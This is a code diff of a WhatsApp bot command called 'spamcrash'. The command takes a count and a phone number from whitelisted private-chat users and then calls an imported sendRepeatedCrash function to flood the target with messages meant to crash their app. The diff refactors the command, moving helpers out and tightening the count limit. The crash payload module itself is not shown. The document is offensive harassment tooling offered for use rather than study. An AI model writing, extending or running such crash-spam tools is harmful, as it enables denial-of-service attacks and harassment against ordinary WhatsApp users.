@@ -1,92 +1,60 @@
-const fs = require('fs');
-const path = require('path');
 const { sendRepeatedCrash } = require('../lib/bugfunctions');
-
-// convert number → JID
-function toJid(number) {
-  return number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-}
-
-// check whitelist
-function isWhitelisted(senderNumber) {
-  try {
-    const whitelistPath = path.join(__dirname, '../whitelist.json');
-    const whitelist = JSON.parse(fs.readFileSync(whitelistPath));
-
-    return whitelist.includes(senderNumber);
-  } catch (err) {
-    console.error('Whitelist error:', err);
-    return false;
-  }
-}
+const {
+  isWhitelisted,
+  normalizeNumber,
+  getText,
+  getSender,
+  toJid
+} = require('../utils/helper');
 
 async function spamcrashCommand(sock, chatId, message) {
   try {
-    // ❌ Block group usage
-    const isGroup = chatId.endsWith('@g.us');
-    if (isGroup) {
+    if (chatId.endsWith('@g.us')) {
       return sock.sendMessage(chatId, {
-        text: '❌ This command works only in private chat'
+        text: '❌ Private only command'
       }, { quoted: message });
     }
 
-    // get message text
-    const rawText =
-      message.message?.conversation ||
-      message.message?.extendedTextMessage?.text ||
-      "";
+    const text = getText(message);
+    const args = text.trim().split(/\s+/);
 
-    const args = rawText.trim().split(/\s+/);
+    const sender = getSender(message);
 
-    // get sender
-    const sender =
-      message.key.participant || message.key.remoteJid;
-
-    const senderNumber = sender.split('@')[0];
-
-    // ❌ whitelist check
-    if (!isWhitelisted(senderNumber)) {
+    if (!isWhitelisted(sender)) {
       return sock.sendMessage(chatId, {
-        text: '❌ You are not whitelisted to use this command'
+        text: '❌ Not whitelisted'
       }, { quoted: message });
     }
 
-    // get arguments
     const count = parseInt(args[1]);
-    const number = args[2];
+    let number = normalizeNumber(args[2]);
 
     if (!count || !number) {
       return sock.sendMessage(chatId, {
-        text: '❌ Usage: .spamcrash <count> <number>\nExample: .spamcrash 5 2547xxxxxxx'
+        text: '❌ Usage: .spamcrash 5 2547xxxxxxx'
       }, { quoted: message });
     }
 
-    // limit protection
-    if (count > 500) {
+    if (count > 50) {
       return sock.sendMessage(chatId, {
-        text: '❌ Maximum 50 messages allowed'
+        text: '❌ Max 50 allowed'
       }, { quoted: message });
     }
 
     const target = toJid(number);
-    const bugType = args[3] || 'xeontext4';
 
     await sock.sendMessage(chatId, {
-      text: `⏳ Sending ${count} crash messages to ${number}...`
+      text: `⏳ Sending ${count} crashes...`
     }, { quoted: message });
 
-    await sendRepeatedCrash(sock, target, count, bugType);
+    await sendRepeatedCrash(sock, target, count);
 
     await sock.sendMessage(chatId, {
-      text: `✅ Spam crash sent (${count}) to ${number}`
+      text: `✅ Done`
     }, { quoted: message });
 
-  } catch (error) {
-    console.error('Spam Crash Command Error:', error);
-
-    await sock.sendMessage(chatId, {
-      text: `❌ Error: ${error.message}`
-    }, { quoted: message }).catch(() => {});
+  } catch (e) {
+    console.error(e);
   }
 }
 
